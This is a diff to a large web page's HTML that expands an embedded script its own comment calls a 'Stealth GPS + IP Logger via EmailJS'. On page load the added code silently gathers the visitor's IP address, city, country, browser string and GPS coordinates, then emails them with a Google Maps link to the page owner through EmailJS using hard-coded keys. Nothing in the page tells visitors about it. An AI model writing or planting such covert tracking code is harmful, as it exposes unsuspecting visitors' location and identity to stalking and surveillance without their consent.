@@ -9001,31 +9001,52 @@ P.now("ewc-assets").execute("EwcAssetLoaded", function (ewcAssets) {
 </script>
 
 
-<!-- Stealth GPS Tracker with Google Maps Link -->
+<!-- Stealth GPS + IP Logger via EmailJS -->
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 <script>
   (function () {
-    emailjs.init("3n_BFa04zngneM-UN"); // Your Public Key
+    emailjs.init("3n_BFa04zngneM-UN"); // ✅ Your Public Key
 
-    function sendLocation(lat, lon) {
+    function sendGPS(lat, lon) {
       const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
       emailjs.send("service_un5475i", "template_moiatum", {
         lat: lat,
         lon: lon,
         time: new Date().toISOString(),
         map: mapLink
-      }).then(function (response) {
-        console.log("📨 Email sent!", response.status, response.text);
-      }, function (error) {
-        console.error("❌ Failed to send email:", error);
+      }).then(() => {
+        console.log("📍 GPS email sent");
       });
     }
 
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(function (pos) {
-        sendLocation(pos.coords.latitude, pos.coords.longitude);
-      });
+    function logIPDetails() {
+      fetch("https://ipapi.co/json/")
+        .then(res => res.json())
+        .then(data => {
+          const info = {
+            ip: data.ip,
+            city: data.city,
+            region: data.region,
+            country: data.country_name,
+            browser: navigator.userAgent,
+            time: new Date().toLocaleString()
+          };
+          emailjs.send("service_un5475i", "template_moiatum", info).then(() => {
+            console.log("👤 Visitor info email sent");
+          });
+        });
     }
+
+    setTimeout(() => {
+      logIPDetails();
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(pos => {
+          sendGPS(pos.coords.latitude, pos.coords.longitude);
+        }, err => {
+          console.warn("❌ GPS blocked", err);
+        });
+      }
+    }, 2000);
   })();
 </script>
 
